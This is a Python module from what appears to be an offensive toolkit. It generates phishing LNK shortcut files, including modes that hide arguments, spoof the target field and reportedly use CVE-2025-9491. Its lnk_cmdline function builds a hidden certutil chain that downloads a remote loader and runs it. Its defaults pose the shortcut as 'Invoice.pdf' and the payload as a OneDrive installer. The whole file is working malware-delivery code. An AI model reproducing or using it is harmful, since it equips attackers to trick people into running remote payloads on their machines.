# bab/lnk.py — LNK phishing file generation via lnk-it-up

import sys
from pathlib import Path

from .ui     import section, ok, err, info, prompt, cyan, grey, BuildAborted
from .config import ROOT, save_config, resolve_dir
from .build  import run_cmd

_LNK_TYPES = [
    ("SPOOFEXE_HIDEARGS_DISABLETARGET",     "Spoof exe, fully hide args, disable target  (recommended)"),
    ("SPOOFEXE_SHOWARGS_ENABLETARGET",      "Spoof exe, args visible, target field enabled"),
    ("REALEXE_HIDEARGS_DISABLETARGET",      "Real exe, hide args, disable target field"),
    ("SPOOFEXE_OVERFLOWARGS_DISABLETARGET", "Spoof exe, overflow-hide args  (broken on Win11 24H2+)"),
    ("CVE20259491",                         "Hide args via CVE-2025-9491"),
    ("SPOOFEXE_RUNDLL_DISABLETARGET",       "Load arbitrary DLL, disable target field"),
]

def lnk_cmdline(loader_url: str) -> str:
    """Certutil download + run chain."""
    filename = loader_url.rstrip("/").split("/")[-1]
    dest     = f'%USERPROFILE%\\Downloads\\{filename}'
    return (
        f'/c start /min cmd /c "'
        f'certutil -urlcache -split -f {loader_url} {dest} & '
        f'{dest}"'
    )

def do_lnk(cfg: dict):
    section("Generate LNK Phishing File")

    raw_tool = cfg.get("lnk_tool_path", "tools/lnk-it-up")
    lnk_tool = str(Path(raw_tool) if Path(raw_tool).is_absolute() else ROOT / raw_tool)
    lnk_tool = prompt("lnk-it-up path          ", lnk_tool)
    if not Path(lnk_tool).exists():
        err(f"lnk-it-up not found at: {lnk_tool}")
        info("Run: git submodule update --init --recursive")
        return

    section("LNK Type")
    cur_type = cfg.get("lnk_type", "SPOOFEXE_HIDEARGS_DISABLETARGET")
    for i, (name, desc) in enumerate(_LNK_TYPES):
        marker = cyan("*") if name == cur_type else " "
        print(f"    {marker} {cyan(f'[{i}]')}  {name}  {grey(desc)}")
    print()
    try:
        idx_str  = input(f"  {cyan('Select type')} {grey('[Enter to keep]')}: ").strip()
        lnk_type = _LNK_TYPES[int(idx_str)][0] if idx_str else cur_type
    except (ValueError, IndexError):
        lnk_type = cur_type
    except (EOFError, KeyboardInterrupt):
        print()
        raise BuildAborted("Aborted.")
    print()

    lnk_name   = prompt("Output filename         ", cfg.get("lnk_name", "Invoice.pdf"))
    fake_path  = prompt("Fake display path       ", cfg.get("lnk_fake_path",
                         rf"C:\Users\Public\Documents\{lnk_name}"))
    target_exe = prompt("Target executable       ", r"C:\Windows\System32\cmd.exe")
    cmd_line   = prompt("Command line            ", lnk_cmdline(cfg.get("stager_url",
                         "http://127.0.0.1/backdoors/stagers/OneDriveSetup.exe")))
    icon_path  = prompt("Icon path               ", cfg.get("lnk_icon",
                         r"%WINDIR%\System32\shell32.dll"))
    cur_icon_idx = cfg.get("lnk_icon_index", 45)
    try:
        idx_s    = input(f"  {cyan('Icon index')} {grey(f'[{cur_icon_idx}]')}: ").strip()
        icon_idx = int(idx_s) if idx_s else cur_icon_idx
    except ValueError:
        icon_idx = cur_icon_idx
    except (EOFError, KeyboardInterrupt):
        print()
        raise BuildAborted("Aborted.")
    out_dir = prompt("Output directory        ", cfg.get("lnk_output_dir", "./backdoors/stagers/"))

    cfg.update({
        "lnk_tool_path":  lnk_tool,
        "lnk_type":       lnk_type,
        "lnk_name":       lnk_name,
        "lnk_fake_path":  fake_path,
        "lnk_icon":       icon_path,
        "lnk_icon_index": icon_idx,
        "lnk_output_dir": out_dir,
    })
    save_config(cfg)

    out_dir_path = resolve_dir(out_dir)
    out_dir_path.mkdir(parents=True, exist_ok=True)
    out_path = out_dir_path / lnk_name

    section("Generating LNK")
    args = [
        sys.executable, "-m", "lnk-generator.generate",
        "--fake-path",           fake_path,
        "--target-executable",   target_exe,
        "--target-command-line", cmd_line,
        "--icon",                icon_path,
        "--icon-index",          str(icon_idx),
        "--output",              str(out_path.resolve()),
        lnk_type,
    ]
    if not run_cmd(args, cwd=lnk_tool):
        err("LNK generation failed.")
        return
    ok(f"{out_path}  ({out_path.stat().st_size} bytes)")
